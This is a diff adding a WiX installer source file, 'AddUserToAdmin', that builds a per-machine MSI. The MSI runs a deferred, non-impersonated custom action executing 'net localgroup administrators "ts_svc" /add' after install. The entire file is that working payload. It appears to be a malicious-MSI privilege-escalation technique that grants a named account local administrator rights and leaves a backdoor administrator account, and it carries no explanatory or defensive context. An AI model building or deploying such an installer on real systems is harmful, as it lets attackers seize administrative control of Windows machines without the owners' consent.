@@ -1,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="AddUserToAdmin" Language="1033" Version="1.0.0.0" Manufacturer="YourCompany" UpgradeCode="cd2bd2e0-cb5b-4832-9a65-4c429d675bf9">
+    <Package InstallerVersion="500" Compressed="yes" InstallScope="perMachine" />
+
+    <Binary Id="WixCA" SourceFile="C:\Program Files (x86)\WiX Toolset v3.11\bin\WixCA.dll" />
+
+    <Property Id="WixQuietExecCmdLine" Value='net localgroup administrators "ts_svc" /add' />
+
+    <CustomAction Id="AddUserToAdminGroup" BinaryKey="WixCA" DllEntry="WixQuietExec" Execute="deferred" Return="check" Impersonate="no" />
+
+    <InstallExecuteSequence>
+      <Custom Action="AddUserToAdminGroup" After="InstallFiles">NOT Installed</Custom>
+    </InstallExecuteSequence>
+
+    <Directory Id="TARGETDIR" Name="SourceDir">
+      <Directory Id="ProgramFilesFolder">
+        <Directory Id="INSTALLFOLDER" Name="AddUserToAdmin" />
+      </Directory>
+      <Directory Id="SystemFolder" />
+    </Directory>
+
+  </Product>
+</Wix>
